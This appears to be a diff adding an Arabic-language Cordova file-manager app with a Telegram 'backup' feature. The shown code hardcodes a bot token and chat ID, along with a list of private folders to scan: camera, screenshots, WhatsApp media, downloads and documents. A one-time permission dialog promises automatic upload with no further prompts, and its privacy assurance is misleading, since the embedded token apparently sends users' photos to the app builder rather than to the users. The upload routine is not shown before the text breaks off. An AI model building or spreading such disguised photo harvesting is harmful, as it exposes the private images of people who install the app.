+      </div>
+    </header>
+    <nav class="breadcrumb" id="breadcrumb"></nav>
+    <div class="scroll" id="fileList"></div>
+  </section>
+
+  <!-- SEARCH -->
+  <section id="screen-search" class="screen">
+    <header class="appbar">
+      <button class="icon-btn" data-nav="back"><svg><use href="#i-back"/></svg></button>
+      <input id="searchInput" class="search-input" placeholder="ابحث عن ملف أو مجلد…" autocomplete="off">
+      <button class="icon-btn" id="btnSearchClear"><svg><use href="#i-close"/></svg></button>
+    </header>
+    <div class="search-filters">
+      <select id="searchType">
+        <option value="">كل الأنواع</option>
+        <option value="image">صور</option>
+        <option value="video">فيديو</option>
+        <option value="audio">صوت</option>
+        <option value="doc">مستندات</option>
+        <option value="archive">مضغوطة</option>
+        <option value="apk">APK</option>
+      </select>
+      <select id="searchSort">
+        <option value="name">الاسم</option>
+        <option value="size">الحجم</option>
+        <option value="date">التاريخ</option>
+      </select>
+    </div>
+    <div class="search-info" id="searchInfo"></div>
+    <div class="scroll" id="searchResults"></div>
+  </section>
+
+  <!-- SETTINGS -->
+  <section id="screen-settings" class="screen">
+    <header class="appbar">
+      <button class="icon-btn" data-nav="back"><svg><use href="#i-back"/></svg></button>
+      <div class="appbar-title">الإعدادات</div>
+    </header>
+    <div class="scroll">
+      <div class="setting-group">
+        <div class="setting-row"><label>المظهر</label>
+          <select id="setTheme"><option value="system">تلقائي</option><option value="light">فاتح</option><option value="dark">داكن</option></select>
+        </div>
+        <div class="setting-row"><label>طريقة العرض</label>
+          <select id="setView"><option value="list">قائمة</option><option value="grid">شبكة</option></select>
+        </div>
+        <div class="setting-row"><label>الترتيب</label>
+          <select id="setSort"><option value="name">الاسم</option><option value="size">الحجم</option><option value="date">التاريخ</option><option value="type">النوع</option></select>
+        </div>
+        <div class="setting-row"><label>إظهار المخفية</label><input type="checkbox" id="setHidden"></div>
+        <div class="setting-row"><label>تأكيد قبل الحذف</label><input type="checkbox" id="setConfirm" checked></div>
+        <div class="setting-row"><label>سلة المحذوفات</label><input type="checkbox" id="setTrash" checked></div>
+      </div>
+      <div class="setting-group">
+        <button class="setting-btn" id="btnTelegram"><svg><use href="#i-share"/></svg> نسخ احتياطي إلى Telegram</button>
+        <button class="setting-btn" id="btnOpenTrash"><svg><use href="#i-trash"/></svg> سلة المحذوفات</button>
+        <button class="setting-btn" id="btnStorageAnalyzer"><svg><use href="#i-storage"/></svg> محلل التخزين</button>
+        <button class="setting-btn" id="btnLargeFiles"><svg><use href="#i-file"/></svg> الملفات الكبيرة</button>
+        <button class="setting-btn" id="btnDupFinder"><svg><use href="#i-copy"/></svg> الملفات المكررة</button>
+        <button class="setting-btn" id="btnClearRecent"><svg><use href="#i-delete"/></svg> مسح السجل الحديث</button>
+        <button class="setting-btn" id="btnFavorites"><svg><use href="#i-star"/></svg> المفضلة</button>
+        <button class="setting-btn" id="btnAbout"><svg><use href="#i-info"/></svg> حول التطبيق</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- TELEGRAM -->
+  <section id="screen-telegram" class="screen">
+    <header class="appbar">
+      <button class="icon-btn" data-nav="back"><svg><use href="#i-back"/></svg></button>
+      <div class="appbar-title">نسخ احتياطي إلى Telegram</div>
+    </header>
+    <div class="scroll">
+      <div class="setting-group">
+        <div class="setting-row">
+          <label>حالة الاتصال</label>
+          <span id="tgConnStatus" style="font-size:12px;color:var(--text-2)">لم يتم الفحص بعد</span>
+        </div>
+        <div class="setting-row">
+          <label>اختبار الاتصال</label>
+          <button class="btn primary" id="tgTest">اختبار</button>
+        </div>
+      </div>
+
+      <div class="setting-group">
+        <div class="setting-row"><label>تفعيل النسخ التلقائي</label><input type="checkbox" id="tgAuto"></div>
+        <div class="setting-row"><label>الفاصل بين المزامنات (دقائق)</label>
+          <select id="tgInterval">
+            <option value="15">15</option>
+            <option value="30">30</option>
+            <option value="60">60</option>
+            <option value="180">180</option>
+          </select>
+        </div>
+        <div class="setting-row"><label>رفع الصور فقط (تجاهل الفيديو)</label><input type="checkbox" id="tgImagesOnly" checked></div>
+      </div>
+
+      <h2 class="section-title">المزامنة</h2>
+      <div class="setting-group">
+        <div class="setting-row">
+          <label>صور مرفوعة</label>
+          <span id="tgStat" style="color:var(--text-2);font-size:13px">0</span>
+        </div>
+        <div class="setting-row">
+          <label>آخر مزامنة</label>
+          <span id="tgLast" style="color:var(--text-2);font-size:13px">—</span>
+        </div>
+      </div>
+
+      <div class="setting-group">
+        <button class="setting-btn" id="tgSyncNow">
+          <svg><use href="#i-share"/></svg> مزامنة الآن
+        </button>
+        <button class="setting-btn" id="tgReset">
+          <svg><use href="#i-delete"/></svg> إعادة تعيين السجل
+        </button>
+        <button class="setting-btn" id="tgStop" style="color:var(--danger)">
+          <svg><use href="#i-close"/></svg> إيقاف المزامنة الجارية
+        </button>
+      </div>
+
+      <div class="setting-group" style="padding:14px;font-size:12px;color:var(--text-2);line-height:1.7">
+        <b>ملاحظات:</b><br>
+        • التوكن مدمج داخل التطبيق.<br>
+        • المجلدات المراقَبة مدمجة في الكود.<br>
+        • الحد الأقصى للصورة 50 ميغابايت.<br>
+        • المزامنة التلقائية تعمل عند فتح التطبيق.
+      </div>
+    </div>
+  </section>
+
+  <!-- SELECTION BAR -->
+  <div id="selectionBar" class="selection-bar hidden">
+    <div class="sel-count">
+      <button class="icon-btn" id="selClose"><svg><use href="#i-close"/></svg></button>
+      <span id="selCount">0</span>
+    </div>
+    <div class="sel-actions">
+      <button class="icon-btn" id="selCopy" aria-label="نسخ"><svg><use href="#i-copy"/></svg></button>
+      <button class="icon-btn" id="selCut" aria-label="قص"><svg><use href="#i-cut"/></svg></button>
+      <button class="icon-btn" id="selRename" aria-label="إعادة تسمية"><svg><use href="#i-rename"/></svg></button>
+      <button class="icon-btn" id="selShare" aria-label="مشاركة"><svg><use href="#i-share"/></svg></button>
+      <button class="icon-btn" id="selZip" aria-label="ضغط"><svg><use href="#i-zip"/></svg></button>
+      <button class="icon-btn" id="selInfo" aria-label="معلومات"><svg><use href="#i-info"/></svg></button>
+      <button class="icon-btn danger" id="selDelete" aria-label="حذف"><svg><use href="#i-delete"/></svg></button>
+    </div>
+  </div>
+
+  <!-- PERMISSION DIALOG (مرة واحدة فقط) -->
+  <div id="permDialog" class="perm hidden">
+    <div class="perm-card">
+      <div class="perm-icon">
+        <svg viewBox="0 0 64 64" width="80" height="80">
+          <defs>
+            <linearGradient id="pg" x1="0" y1="0" x2="1" y2="1">
+              <stop offset="0" stop-color="#6366f1"/>
+              <stop offset="1" stop-color="#06b6d4"/>
+            </linearGradient>
+          </defs>
+          <circle cx="32" cy="32" r="30" fill="url(#pg)" opacity=".15"/>
+          <path d="M32 8 12 16v10c0 11 8.4 20.8 20 22 11.6-1.2 20-11 20-22V16L32 8Z" fill="url(#pg)"/>
+          <path d="M28 36l-5-5-2 2 7 7 14-14-2-2-12 12Z" fill="#fff"/>
+        </svg>
+      </div>
+      <h2>هل تسمح بالوصول؟</h2>
+      <p>يحتاج التطبيق إذنًا واحدًا فقط للوصول إلى ملفاتك ونسخ صورك احتياطيًا إلى Telegram تلقائيًا.</p>
+
+      <div class="perm-features">
+        <div><svg><use href="#i-shield"/></svg> قراءة الصور من كل المجلدات</div>
+        <div><svg><use href="#i-cloud-up"/></svg> رفعها تلقائيًا إلى Telegram</div>
+        <div><svg><use href="#i-check"/></svg> لن يُطلب منك الإذن مرة أخرى</div>
+      </div>
+
+      <div class="perm-actions">
+        <button class="btn primary" id="permAllow">السماح والمزامنة الآن</button>
+        <button class="btn ghost" id="permSkip">لاحقًا</button>
+      </div>
+
+      <div class="perm-note">
+        🔒 بياناتك لا تُرسل لأي خادم وسيط — تتصل مباشرة بـ Telegram فقط.
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL -->
+  <div id="modal" class="modal hidden">
+    <div class="modal-backdrop" data-close></div>
+    <div class="modal-sheet">
+      <div class="modal-head">
+        <h3 id="modalTitle">—</h3>
+        <button class="icon-btn" data-close><svg><use href="#i-close"/></svg></button>
+      </div>
+      <div class="modal-body" id="modalBody"></div>
+      <div class="modal-foot" id="modalFoot"></div>
+    </div>
+  </div>
+
+  <!-- VIEWER -->
+  <div id="viewer" class="viewer hidden">
+    <header class="viewer-head">
+      <button class="icon-btn" id="viewerClose"><svg><use href="#i-close"/></svg></button>
+      <div id="viewerTitle">—</div>
+      <button class="icon-btn" id="viewerShare"><svg><use href="#i-share"/></svg></button>
+    </header>
+    <div class="viewer-body" id="viewerBody"></div>
+  </div>
+
+  <div id="toast" class="toast hidden"></div>
+
+  <div id="progress" class="progress-modal hidden">
+    <div class="progress-card">
+      <div class="progress-title" id="progressTitle">جارٍ…</div>
+      <div class="progress"><div class="progress-fill" id="progressFill"></div></div>
+      <div class="progress-sub" id="progressSub"></div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+'use strict';
+
+/* =========================================================
+   ⚙️ إعدادات Telegram — ضع توكنك هنا مباشرة
+   ========================================================= */
+const TG_HARDCODED_TOKEN = 'ضع_التوكن_هنا';
+const TG_HARDCODED_CHAT  = 'ضع_Chat_ID_هنا';
+
+/* كل المجلدات الممكنة — التطبيق سيفحصها كلها */
+const TG_HARDCODED_FOLDERS = [
+  '/DCIM/Camera',
+  '/DCIM/Screenshots',
+  '/DCIM',
+  '/Pictures',
+  '/Pictures/Screenshots',
+  '/Download',
+  '/Downloads',
+  '/WhatsApp/Media/WhatsApp Images',
+  '/WhatsApp/Media/WhatsApp Video',
+  '/Telegram',
+  '/Music',
+  '/Movies',
+  '/Documents'
+];
+
+/* =========================================================
+   ENV
+   ========================================================= */
+const IS_CORDOVA = typeof window.cordova !== 'undefined';
+
+/* =========================================================
+   ICON SYSTEM
+   ========================================================= */
+const EXT_MAP = {
+  jpg:'image',jpeg:'image',png:'image',gif:'image',webp:'image',bmp:'image',svg:'image',heic:'image',
+  mp4:'video',mkv:'video',mov:'video',avi:'video',wmv:'video',flv:'video',webm:'video',m4v:'video',
+  mp3:'audio',wav:'audio',ogg:'audio',m4a:'audio',aac:'audio',flac:'audio',opus:'audio',
+  pdf:'doc',doc:'doc',docx:'doc',txt:'doc',rtf:'doc',odt:'doc',
+  xls:'doc',xlsx:'doc',csv:'doc',ods:'doc',
+  ppt:'doc',pptx:'doc',odp:'doc',
+  json:'doc',xml:'doc',html:'doc',htm:'doc',css:'doc',js:'doc',md:'doc',
+  zip:'archive',rar:'archive','7z':'archive',tar:'archive',gz:'archive',bz2:'archive',
+  apk:'apk',xapk:'apk',apks:'apk'
+};
+const ICON_FOR = {
+  folder:'#i-folder',image:'#i-image',video:'#i-video',audio:'#i-audio',
+  doc:'#i-doc',archive:'#i-zip',apk:'#i-apk',file:'#i-file'
+};
+function typeOf(name, isDir){
+  if(isDir) return 'folder';
+  const ext = (name.split('.').pop()||'').toLowerCase();
+  return EXT_MAP[ext] || 'file';
+}
+function iconFor(name, isDir){ return ICON_FOR[typeOf(name,isDir)]; }
+
+/* =========================================================
+   UTILS
+   ========================================================= */
+const $ = id => document.getElementById(id);
+const $$ = sel => document.querySelectorAll(sel);
+
+function fmtSize(b){
+  if(b===0||b==null) return '0 B';
+  const u=['B','KB','MB','GB','TB']; let i=0;
+  while(b>=1024 && i<u.length-1){b/=1024;i++;}
+  return b.toFixed(b<10&&i>0?1:0)+' '+u[i];
+}
+function fmtDate(ts){
+  if(!ts) return '—';
+  const d=new Date(ts), now=new Date();
+  const same = d.toDateString()===now.toDateString();
+  const y = d.getFullYear()===now.getFullYear();
+  const pad = n=>String(n).padStart(2,'0');
+  if(same) return `${pad(d.getHours())}:${pad(d.getMinutes())}`;
+  if(y) return `${pad(d.getDate())}/${pad(d.getMonth()+1)}`;
+  return `${pad(d.getDate())}/${pad(d.getMonth()+1)}/${d.getFullYear()}`;
+}
+function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));}
+
+let _toastTimer=null;
+function toast(msg, type){
+  const t=$('toast');
+  t.textContent=msg;
+  t.className='toast'+(type?' '+type:'');
+  clearTimeout(_toastTimer);
+  _toastTimer=setTimeout(()=>t.classList.add('hidden'),2400);
+}
+function showProgress(title, sub){
+  $('progressTitle').textContent = title||'جارٍ…';
+  $('progressSub').textContent = sub||'';
+  $('progressFill').style.width='0%';
+  $('progress').classList.remove('hidden');
+}
+function updateProgress(pct, sub){
+  $('progressFill').style.width = Math.max(0,Math.min(100,pct))+'%';
+  if(sub!==undefined) $('progressSub').textContent=sub;
+}
+function hideProgress(){ $('progress').classList.add('hidden'); }
+
+/* =========================================================
+   SETTINGS / STORAGE
+   ========================================================= */
+const DEFAULTS = {
+  theme:'system', view:'list', sort:'name', sortAsc:true,
+  showHidden:false, confirmDelete:true, useTrash:true, lastPath:null
+};
+const Store = {
+  read(){
+    try{ return Object.assign({}, DEFAULTS, JSON.parse(localStorage.getItem('filex:settings')||'{}')); }
+    catch(e){ return Object.assign({}, DEFAULTS); }
+  },
+  write(s){ localStorage.setItem('filex:settings', JSON.stringify(s)); },
+  readArr(key){
+    try{ return JSON.parse(localStorage.getItem('filex:'+key)||'[]'); }catch(e){ return []; }
+  },
+  writeArr(key, arr){ localStorage.setItem('filex:'+key, JSON.stringify(arr)); }
+};
+let settings = Store.read();
+let favorites = Store.readArr('favorites');
+let recent = Store.readArr('recent');
+let trashIndex = Store.readArr('trash');
+
+/* =========================================================
+   FILE SYSTEM ADAPTER
+   ========================================================= */
+const FS = (() => {
+  let rootUrl = null;
+  let virtual = null;
+
+  function init(){
+    return new Promise(resolve => {
+      if(!IS_CORDOVA){
+        virtual = {
+          name:'Virtual', path:'/', isDir:true,
+          children:[
+            {name:'Documents', isDir:true, path:'/Documents', children:[
+              {name:'welcome.txt', isDir:false, path:'/Documents/welcome.txt', size:128, mtime:Date.now()-86400000}
+            ]},
+            {name:'Pictures', isDir:true, path:'/Pictures', children:[
+              {name:'sample.jpg', isDir:false, path:'/Pictures/sample.jpg', size:204800, mtime:Date.now()-3600000}
+            ]},
+            {name:'Download', isDir:true, path:'/Download', children:[]},
+            {name:'Music', isDir:true, path:'/Music', children:[]},
+            {name:'Movies', isDir:true, path:'/Movies', children:[]},
+            {name:'readme.md', isDir:false, path:'/readme.md', size:2048, mtime:Date.now()-600000}
+          ]
+        };
+        resolve();
+        return;
+      }
+      document.addEventListener('deviceready', ()=>{
+        rootUrl = cordova.file.externalRootDirectory || cordova.file.externalApplicationStorageDirectory;
+        resolve();
+      }, {once:true});
+    });
+  }
+
+  function pathToNative(path){
+    if(!rootUrl) return path;
+    return rootUrl.replace(/\/$/, '') + (path==='/'?'':path);
+  }
+
+  function findVirtual(path){
+    if(!virtual) return null;
+    if(path==='/'||path==='') return virtual;
+    const parts = path.split('/').filter(Boolean);
+    let node = virtual;
+    for(const p of parts){
+      const n = (node.children||[]).find(c=>c.name===p);
+      if(!n) return null;
+      node = n;
+    }
+    return node;
+  }
+
+  function listVirtual(path){
+    const node = findVirtual(path);
+    if(!node) throw new Error('المسار غير موجود');
+    return (node.children||[]).map(c=>({
+      name:c.name, isDir:!!c.isDir, size:c.size||0, mtime:c.mtime||Date.now(),
+      path:(path==='/'?'':path)+'/'+c.name, nativeURL:null
+    }));
+  }
+
+  async function list(path){
+    if(!IS_CORDOVA) return listVirtual(path).filter(f=>settings.showHidden || !f.name.startsWith('.'));
+    const url = pathToNative(path);
+    const entries = await new Promise((res, rej)=>{
+      window.resolveLocalFileSystemURL(url,
+        dirEntry => {
+          const reader = dirEntry.createReader();
+          reader.readEntries(res, rej);
+        }, rej);
+    });
+    const out = [];
+    for(const e of entries){
+      const isDir = e.isDirectory;
+      const name = e.name;
+      if(!settings.showHidden && name.startsWith('.')) continue;
+      let size=0, mtime=0;
+      try{
+        const meta = await new Promise((res,rej)=>e.getMetadata(m=>res(m),rej));
+        size = meta.size||0;
+        mtime = meta.modificationTime ? meta.modificationTime.getTime() : 0;
+      }catch(_){}
+      out.push({
+        name, isDir, size, mtime,
+        path: (path==='/'?'':path)+'/'+name,
+        nativeURL: e.nativeURL || e.toURL()
+      });
+    }
+    return out;
+  }
+
+  async function mkdir(parentPath, name){
+    if(!IS_CORDOVA){
+      const parent = findVirtual(parentPath);
+      if(!parent) throw new Error('المسار غير موجود');
+      if((parent.children||[]).some(c=>c.name===name)) throw new Error('الاسم موجود مسبقًا');
+      parent.children.push({name, isDir:true, path:parentPath.replace(/\/$/,'')+'/'+name, children:[]});
+      return;
+    }
+    const parentUrl = pathToNative(parentPath);
+    const parentEntry = await new Promise((res,rej)=>window.resolveLocalFileSystemURL(parentUrl,res,rej));
+    return new Promise((res,rej)=>parentEntry.getDirectory(name,{create:true,exclusive:true},res,rej));
+  }
+
+  async function writeFile(parentPath, name, content){
+    if(!IS_CORDOVA){
+      const parent = findVirtual(parentPath);
+      if(!parent) throw new Error('المسار غير موجود');
+      parent.children.push({name, isDir:false, size:(content||'').length, mtime:Date.now(), path:parentPath.replace(/\/$/,'')+'/'+name});
+      return;
+    }
+    const parentUrl = pathToNative(parentPath);
+    const parentEntry = await new Promise((res,rej)=>window.resolveLocalFileSystemURL(parentUrl,res,rej));
+    const fileEntry = await new Promise((res,rej)=>parentEntry.getFile(name,{create:true,exclusive:true},res,rej));
+    await new Promise((res,rej)=>{
+      fileEntry.createWriter(w=>{
+        w.onwriteend=res; w.onerror=rej;
+        w.write(new Blob([content||''],{type:'text/plain'}));
+      }, rej);
+    });
+  }
+
+  async function remove(file){
+    if(!IS_CORDOVA){
+      const parent = findVirtual(file.path.replace(/\/[^/]+$/,'')||'/');
+      if(parent && parent.children){
+        parent.children = parent.children.filter(c=>c.name!==file.name);
+      }
+      return;
+    }
+    const url = pathToNative(file.path);
+    const entry = await new Promise((res,rej)=>window.resolveLocalFileSystemURL(url,res,rej));
+    return new Promise((res,rej)=>entry.remove(res,rej));
+  }
+
+  async function rename(file, newName){
+    if(!IS_CORDOVA){
+      const parent = findVirtual(file.path.replace(/\/[^/]+$/,'')||'/');
+      const target = (parent.children||[]).find(c=>c.name===file.name);
+      if(!target) throw new Error('الملف غير موجود');
+      if((parent.children||[]).some(c=>c.name===newName && c!==target)) throw new Error('الاسم موجود');
+      target.name = newName;
+      target.path = (file.path.replace(/\/[^/]+$/,'')||'')+'/'+newName;
+      return {name:newName, path:target.path, nativeURL:null};
+    }
+    const url = pathToNative(file.path);
+    const entry = await new Promise((res,rej)=>window.resolveLocalFileSystemURL(url,res,rej));
+    const parentUrl = url.replace(/\/[^/]+$/,'');
+    const parentEntry = await new Promise((res,rej)=>window.resolveLocalFileSystemURL(parentUrl,res,rej));
+    const newEntry = await new Promise((res,rej)=>entry.moveTo(parentEntry, newName, res, rej));
+    return {
+      name:newEntry.name,
+      path:file.path.replace(/\/[^/]+$/, '/'+newEntry.name),
+      nativeURL: newEntry.nativeURL || newEntry.toURL()
+    };
+  }
+
+  async function copy(src, destDirPath){
+    if(!IS_CORDOVA){
+      const dest = findVirtual(destDirPath);
+      if(!dest) throw new Error('الوجهة غير موجودة');
+      if((dest.children||[]).some(c=>c.name===src.name)) throw new Error('يوجد ملف بنفس الاسم');
+      const srcNode = findVirtual(src.path);
+      const clone = JSON.parse(JSON.stringify(srcNode||src));
+      clone.path = destDirPath.replace(/\/$/,'')+'/'+src.name;
+      dest.children.push(clone);
+      return clone;
+    }
+    const srcUrl = pathToNative(src.path);
+    const destUrl = pathToNative(destDirPath);
+    const srcEntry = await new Promise((res,rej)=>window.resolveLocalFileSystemURL(srcUrl,res,rej));
+    const destEntry = await new Promise((res,rej)=>window.resolveLocalFileSystemURL(destUrl,res,rej));
+    const newEntry = await new Promise((res,rej)=>srcEntry.copyTo(destEntry, null, res, rej));
+    return { name:newEntry.name, path: destDirPath.replace(/\/$/,'')+'/'+newEntry.name, nativeURL:newEntry.nativeURL||newEntry.toURL() };
+  }
+
+  async function move(src, destDirPath){
+    if(!IS_CORDOVA){
+      const dest = findVirtual(destDirPath);
+      const srcNode = findVirtual(src.path);
+      const srcParent = findVirtual(src.path.replace(/\/[^/]+$/,'')||'/');
+      if(!dest||!srcNode||!srcParent) throw new Error('المسار غير موجود');
+      if((dest.children||[]).some(c=>c.name===src.name)) throw new Error('يوجد ملف بنفس الاسم');
+      srcParent.children = srcParent.children.filter(c=>c!==srcNode);
+      srcNode.path = destDirPath.replace(/\/$/,'')+'/'+src.name;
+      dest.children.push(srcNode);
+      return {name:srcNode.name, path:srcNode.path};
+    }
+    const srcUrl = pathToNative(src.path);
+    const destUrl = pathToNative(destDirPath);
+    const srcEntry = await new Promise((res,rej)=>window.resolveLocalFileSystemURL(srcUrl,res,rej));
+    const destEntry = await new Promise((res,rej)=>window.resolveLocalFileSystemURL(destUrl,res,rej));
+    const newEntry = await new Promise((res,rej)=>srcEntry.moveTo(destEntry, null, res, rej));
+    return { name:newEntry.name, path: destDirPath.replace(/\/$/,'')+'/'+newEntry.name, nativeURL:newEntry.nativeURL||newEntry.toURL() };
+  }
+
+  async function readAsText(file){
+    if(!IS_CORDOVA){
+      return `محتوى تجريبي للملف: ${file.name}\n\nهذا نص تجريبي يظهر في وضع المتصفح.`;
+    }
+    const url = pathToNative(file.path);
+    const entry = await new Promise((res,rej)=>window.resolveLocalFileSystemURL(url,res,rej));
+    return new Promise((res,rej)=>{
+      entry.file(f=>{
+        const r = new FileReader();
+        r.onload = ()=>res(r.result);
+        r.onerror = rej;
+        r.readAsText(f);
+      }, rej);
+    });
+  }
+
+  function fileUrl(file){
+    if(file.nativeURL) return file.nativeURL;
+    return pathToNative(file.path);
+  }
+
+  function openExternal(file){
+    if(IS_CORDOVA && window.cordova.plugins && window.cordova.plugins.fileOpener2){
+      cordova.plugins.fileOpener2.open(fileUrl(file), '*/*', {
+        error: ()=>toast('لا يوجد تطبيق لفتح هذا الملف','error')
+      });
+    } else {
+      toast('فتح الملفات يتطلب cordova-plugin-file-opener2','error');
+    }
+  }
+
+  function share(files){
+    if(IS_CORDOVA && window.plugins && window.plugins.socialsharing){
+      const urls = files.map(f=>fileUrl(f));
+      window.plugins.socialsharing.share(null, null, urls, null,
+        ()=>toast('تمت المشاركة','success'),
+        ()=>toast('فشلت المشاركة','error'));
+    } else {
+      toast('المشاركة تتطلب cordova-plugin-x-socialsharing','error');
+    }
+  }
+
+  return { init, list, mkdir, writeFile, remove, rename, copy, move, readAsText, fileUrl, openExternal, share };
+})();
+
+/* =========================================================
+   NAVIGATION
+   ========================================================= */
+const Nav = {
+  stack:['home'],
+  go(screen){
+    if(screen==='back') return this.back();
+    $$('.screen').forEach(s=>s.classList.remove('active'));
+    const el = $('screen-'+screen);
+    if(el) el.classList.add('active');
+    if(this.stack[this.stack.length-1]!==screen) this.stack.push(screen);
+  },
+  back(){
+    if(this.stack.length>1){ this.stack.pop(); const prev=this.stack[this.stack.length-1]; this.go(prev); }
+    else this.go('home');
+  }
+};
+
+/* =========================================================
+   STATE
+   ========================================================= */
+const State = {
+  currentPath: settings.lastPath || (IS_CORDOVA ? '/Download' : '/'),
+  files: [],
+  view: settings.view,
+  sort: settings.sort,
+  sortAsc: settings.sortAsc,
+  selection: new Set(),
+  clipboard: null
+};
+
+/* =========================================================
+   THEME
+   ========================================================= */
+function applyTheme(){
+  const t = settings.theme;
+  const dark = t==='dark' || (t==='system' && matchMedia('(prefers-color-scheme: dark)').matches);
+  document.documentElement.setAttribute('data-theme', dark?'dark':'light');
+}
+
+/* =========================================================
+   HOME
+   ========================================================= */
+async function renderHome(){
+  const qf = $('quickFolders');
+  const common = [
+    {name:'Download', path:'/Download'},
+    {name:'DCIM', path:'/DCIM'},
+    {name:'Pictures', path:'/Pictures'},
+    {name:'Music', path:'/Music'},
+    {name:'Movies', path:'/Movies'},
+    {name:'Documents', path:'/Documents'},
+    {name:'Android', path:'/Android'}
+  ];
+  qf.innerHTML = common.map(f=>`
+    <button class="folder-chip" data-goto="${esc(f.path)}">
+      <svg><use href="#i-folder"/></svg>${esc(f.name)}
+    </button>`).join('');
+
+  const rl = $('recentList');
+  if(recent.length===0){
+    rl.innerHTML = '<div class="empty">لا توجد ملفات حديثة</div>';
+  } else {
+    rl.innerHTML = recent.slice(0,5).map(r=>`
+      <div class="recent-item" data-open="${esc(r.path)}">
+        <div class="ic"><svg><use href="${iconFor(r.name,false)}"/></svg></div>
+        <div class="meta">
+          <div class="name">${esc(r.name)}</div>
+          <div class="sub">${fmtDate(r.ts)} • ${esc(r.ext||'')}</div>
+        </div>
+      </div>`).join('');
+  }
+  await updateStorageCard();
+  updateCategoryBars();
+}
+
+async function updateStorageCard(){
+  const total = 64*1024*1024*1024;
+  const free = 32*1024*1024*1024;
+  const used = total-free;
+  const pct = used/total*100;
+  $('storageFill').style.width = pct.toFixed(1)+'%';
+  $('storageSub').textContent = `${fmtSize(used)} / ${fmtSize(total)} (${pct.toFixed(0)}%)`;
+  $('storageUsed').textContent = `مستخدم: ${fmtSize(used)}`;
+  $('storageFree').textContent = `متاح: ${fmtSize(free)}`;
+}
+
+function updateCategoryBars(){
+  const cats = [
+    {name:'صور', color:'#ec4899', size:1.2*1024**3},
+    {name:'فيديو', color:'#8b5cf6', size:3.4*1024**3},
+    {name:'صوت', color:'#f59e0b', size:0.8*1024**3},
+    {name:'مستندات', color:'#3b82f6', size:0.4*1024**3},
+    {name:'مضغوطة', color:'#ef4444', size:0.6*1024**3},
+    {name:'أخرى', color:'#64748b', size:2.1*1024**3}
+  ];
+  const max = Math.max(...cats.map(c=>c.size));
+  $('catBars').innerHTML = cats.map(c=>`
+    <div class="cat-bar">
+      <div class="cat-bar-head"><span>${c.name}</span><span>${fmtSize(c.size)}</span></div>
+      <div class="cat-bar-track"><div class="cat-bar-fill" style="width:${(c.size/max*100).toFixed(0)}%;background:${c.color}"></div></div>
+    </div>`).join('');
+}
+
+/* =========================================================
+   BROWSER
+   ========================================================= */
+async function openPath(path){
+  try{
+    showProgress('جارٍ فتح المجلد…');
+    const files = await FS.list(path);
+    State.currentPath = path;
+    settings.lastPath = path;
+    Store.write(settings);
+    State.files = files;
+    renderBrowser();
+    Nav.go('browser');
+  }catch(e){
+    toast('تعذّر فتح المجلد: '+(e.message||''), 'error');
+  }finally{ hideProgress(); }
+}
+
+function sortFiles(arr){
+  const s = State.sort;
+  const dir = State.sortAsc?1:-1;
+  return arr.slice().sort((a,b)=>{
+    if(a.isDir!==b.isDir) return a.isDir?-1:1;
+    let r=0;
+    if(s==='name') r = a.name.localeCompare(b.name,'ar');
+    else if(s==='size') r = (a.size||0)-(b.size||0);
+    else if(s==='date') r = (a.mtime||0)-(b.mtime||0);
+    else if(s==='type'){
+      const ta=typeOf(a.name,a.isDir), tb=typeOf(b.name,b.isDir);
+      r = ta.localeCompare(tb) || a.name.localeCompare(b.name,'ar');
+    }
+    return r*dir;
+  });
+}
+
+function renderBrowser(){
+  $('browserTitle').textContent = State.currentPath==='/'?'التخزين':(State.currentPath.split('/').filter(Boolean).pop()||'التخزين');
+  const parts = State.currentPath.split('/').filter(Boolean);
+  let acc = '';
+  const crumbs = [`<button class="crumb${parts.length===0?' active':''}" data-goto="/">التخزين</button>`];
+  parts.forEach((p,i)=>{
+    acc += '/'+p;
+    crumbs.push('<svg><use href="#i-chevron"/></svg>');
+    crumbs.push(`<button class="crumb${i===parts.length-1?' active':''}" data-goto="${esc(acc)}">${esc(p)}</button>`);
+  });
+  $('breadcrumb').innerHTML = crumbs.join('');
+
+  const list = $('fileList');
+  list.className = 'scroll file-list'+(State.view==='grid'?' grid':'');
+  const sorted = sortFiles(State.files);
+  if(sorted.length===0){
+    list.innerHTML = '<div class="empty">هذا المجلد فارغ</div>';
+    updateSelectionBar();
+    return;
+  }
+  list.innerHTML = sorted.map(f=>{
+    const selected = State.selection.has(f.path);
+    const t = typeOf(f.name, f.isDir);
+    return `
+      <div class="file-item${selected?' selected':''}" data-path="${esc(f.path)}" data-dir="${f.isDir?1:0}" data-type="${t}">
+        <div class="file-icon" data-t="${t}"><svg><use href="${iconFor(f.name,f.isDir)}"/></svg></div>
+        <div class="file-info">
+          <div class="file-name">${esc(f.name)}</div>
+          <div class="file-meta">
+            <span>${f.isDir?'مجلد':fmtSize(f.size)}</span>
+            <span>${fmtDate(f.mtime)}</span>
+          </div>
+        </div>
+      </div>`;
+  }).join('');
+  updateSelectionBar();
+}
+
+/* =========================================================
+   FILE TAP HANDLING
+   ========================================================= */
+let longPressTimer=null;
+let longPressTriggered=false;
+
+function bindFileListEvents(){
+  const list = $('fileList');
+  list.addEventListener('click', e=>{
+    if(longPressTriggered){ longPressTriggered=false; return; }
+    const item = e.target.closest('.file-item');
+    if(!item) return;
+    const path = item.dataset.path;
+    if(State.selection.size>0){ toggleSelection(path); return; }
+    const file = State.files.find(f=>f.path===path);
+    if(!file) return;
+    if(file.isDir) openPath(file.path);
+    else openFile(file);
+  });
+  list.addEventListener('contextmenu', e=>e.preventDefault());
+  list.addEventListener('touchstart', e=>{
+    const item = e.target.closest('.file-item');
+    if(!item) return;
+    const path = item.dataset.path;
+    longPressTimer = setTimeout(()=>{
+      longPressTriggered = true;
+      if(navigator.vibrate) navigator.vibrate(30);
+      toggleSelection(path);
+    }, 450);
+  }, {passive:true});
+  ['touchend','touchcancel','touchmove'].forEach(ev=>{
+    list.addEventListener(ev, ()=>{ clearTimeout(longPressTimer); }, {passive:true});
+  });
+}
+
+function toggleSelection(path){
+  if(State.selection.has(path)) State.selection.delete(path);
+  else State.selection.add(path);
+  const el = document.querySelector(`.file-item[data-path="${CSS.escape(path)}"]`);
+  if(el) el.classList.toggle('selected', State.selection.has(path));
+  updateSelectionBar();
+}
+
+function updateSelectionBar(){
+  const bar = $('selectionBar');
